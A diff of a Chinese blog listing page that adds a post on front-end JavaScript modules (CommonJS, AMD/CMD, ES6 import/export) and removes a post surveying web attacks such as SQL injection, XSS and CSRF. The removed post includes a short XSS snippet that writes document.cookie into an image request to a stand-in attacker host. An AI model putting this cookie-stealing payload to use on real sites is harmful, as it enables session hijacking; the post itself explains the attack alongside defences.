@@ -155,6 +155,94 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-前端模块化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/25/前端模块化/">前端模块化</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/25/前端模块化/" class="archive-article-date">
+  	<time datetime="2017-04-25T13:59:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>说说之前和现在知道的模块化</p>
+<ol>
+<li>node.js 的模块化是Common.js规范， 就是每个文件就是一个模块，调用模块的时候就是直接let  fs = require(‘fs’); 这种加载就是运行时加载。 模块输出有两种方式： 1 module.exports = moduleName 或者 exports.moduleFunc = function() {} 这两种方式实现,加载时调用require(‘./module.js’)加载。</li>
+</ol>
+<p>2.前端模块化的方式es6之前的模块化：</p>
+<pre><code>1. 调用即时调用函数实现代码的封装， 可以避免全局污染，这也算是初步的模块的实现
+
+2. AMD规范的模块化，通过require.js配置和加载模块。 模块里面用如下格式实现define(&apos;socket&apos;,&apos;b&apos;, function(socket,b) {    })， 在页面里面加载js文件通过data-main属性加载文件，如果有不支持AMD规范加载的模块，需要配置require-config.js里面的shim属性，
+还有一个是遵守CMD规范的模块化，作为代表的就是SeaJs， AMD与CMD的不同之处在于，首先.AMD是提前执行，在模块开头就加载编译所需的模块， CMD是延迟执行，推崇使用时再加载编译.从AMD规范里面一眼就可以看出依赖了那些模块，CMD需要深入代码才能看到。 CMD的书写格式如下：
+```bash
+
+   define(function() {
+          var a = require(&apos;./a.js&apos;)
+          a.sayName();
+
+          var b = require(&apos;./b.js&apos;)
+          b.sayName();
+       })
+``` 
+</code></pre><ol>
+<li>现在es6解决了前端模块化的问题， 一个模块就是一个文件，模块里面定义的变量外界无法获取，es6通过export 和 import 输出和导入模块中的变量。</li>
+</ol>
+<p>I. export和import命令</p>
+<p>   eg. export let a = 10;  export b =20 等价于export {a, b} ； 那么在另外一个文件里面就可以通过import {a, b} from ‘./test.js’来获取这两个变量。</p>
+<p> export导出函数： export function add () {}; import {add} from ‘./test.js’ 注意的是import引入的变量名要与export输出的变量名相同，如果想要修改名字， 用as指令 ，如import {A as add} from ‘./test.js’，import还可以加载对象的部分输出接口 比如：export function a() {}; export function b() {};  import {a, b} from ‘./test.js’</p>
+<p>II. module命令可以取代import语句，达到整体输入模块的作用， 用法： module test form ‘./test’</p>
+<p>III. export default 为模块指定默认输出， export default function() {};  import加载是可以为该模块指定任意名字，现在vue-cli开发里面都是用的这种组件导出方式。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">es6 模块化</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/25/前端模块化/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="node.js-使用MongoDB存储数据" class="article article-type-node.js  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -760,82 +848,6 @@
 
 
   
-    <article id="post-Web的攻击技术" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/23/Web的攻击技术/">Web的攻击技术</a>
-    </h1>
-  
-
-        
-        <a href="/2017/03/23/Web的攻击技术/" class="archive-article-date">
-  	<time datetime="2017-03-23T06:20:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Web应用的攻击模式：</p>
-<ol>
-<li>主动攻击  2. 被动攻击</li>
-</ol>
-<p>1.以服务器为目标的主动攻击： 主动攻击是指攻击者通过直接访问Web应用， 把攻击代码传入的攻击模式 ， 主动攻击模式最具有代表性的攻击是 SQL注入攻击和OS命令注入攻击<br>  1.SQL注入攻击: 是指针对WebYin应用使用的数据库，通过运行非法的SQL而产生的攻击。<br>  2 OS命令注入攻击是只通过Web应用，执行非法的操作系统命令达到攻击的目的</p>
-<p>2.以服务器为目标的被动攻击： 被动攻击是指利用全套策略执行代码的攻击模式。被动攻击过程中，攻击者不直接对目标Web英语访问发起攻击。<br>   被动攻击的攻击模式如下：1。 攻击者诱使用户点击已经设置好的陷阱， 而陷阱会启动发送已嵌入攻击代码的http请求。  2. 当用户不知不觉中招后，用户的浏览器或邮件客户端就会触发这个陷阱。 3. 中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用， 运行攻击代码。 4.执行完攻击代码，存在安全漏洞的Web应用汇称为攻击者的调班， 可能导致用户所持的Cookie等个人信息被窃取， 登录状态中的用户权限遭恶意滥用等后果，<br>    典型的攻击模式中具有代表性的攻击是跨站脚本攻击（XSS） 和 跨站点请求伪造（CSRF）;</p>
-<p>  2.1 跨站脚本攻击（XSS)：<br>定义：是指在存有安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript进行的一种攻击。 动态创建的脚本可能隐藏着安全漏洞。<br>跨站脚本攻击可能造成的影响: </p>
-<ol>
-<li>利用虚假输入表单骗取用户个人信息</li>
-<li>利用脚本窃取用户的Cookie值， 被害者在不知情的情况下帮助攻击者发送恶意请求</li>
-<li>显示伪造的文章或者图片<br>防止方法： 首先对于用户的输入进行encode编码，或者标签过滤或者将输入的标签进行xss转换，避免在cookie中添加用户个人信息，尽量采用post传输数据而不是get，，将cookie于ip地址绑定，这样窃取到cookie后也没用</li>
-</ol>
-<p>跨站脚本攻击的案例：<br>  在表单中设入的圈套：<br>         1、在输入用户信息的时候，可能输入含有恶意的HTML标签， 动态生成HTML处发生<br>         2.某些网站通过URL中的查询字段来指定表单用户的ID,  攻击者在这个URL后面嵌入恶意代码的URL,这段URL包含脚本， 那么在浏览器打开该URL后， 设置好的脚本会运行，将用户输入的认证信息发送到攻击者网站。<br>  对用户Cookie信息的获取:<br>       在脚本内嵌入指定的xss.js 文件<br>       该文件定义如下:<br>       <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var content = escape(document.cookie);</div><div class="line">document.write(<span class="string">'&lt;img src = http://hackr.js/?&gt;'</span>);</div><div class="line">document.write(content);</div><div class="line">document.write(<span class="string">'&gt;'</span>);</div></pre></td></tr></table></figure></p>
-<pre><code>在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段js代码， 即可访问该域名下的Cookie信息， 然后将这些信息发送至攻击者的Web网站， 记录在它的登陆日志中
-</code></pre><p>   2.2 HTTP首部注入攻击<br>        是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应）<br>   2.3 跨站点请求伪造攻击(CSRF)是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新,就是说用户在已登录的情况下访问了危险网站，这时候危险网站就能获取你的cookie，截取你的登陆信息获得你的登陆权限，从而做一些不好的事情，防止方法可以：1。为cookie添加随机token或者通过验证码的方式。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web  攻击</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/23/Web的攻击技术/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
@@ -929,11 +941,11 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">笔试 js</a>
+                <a href="javascript:void(0)" class="js-tag color2">Jquery</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Jquery</a>
+                <a href="javascript:void(0)" class="js-tag color1">笔试 js</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -969,11 +981,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">vue 条件指令</a>
+                <a href="javascript:void(0)" class="js-tag color1">node.js MongoDB</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">node.js MongoDB</a>
+                <a href="javascript:void(0)" class="js-tag color4">vue 条件指令</a>
               </li>
              
               <li class="article-tag-list-item">
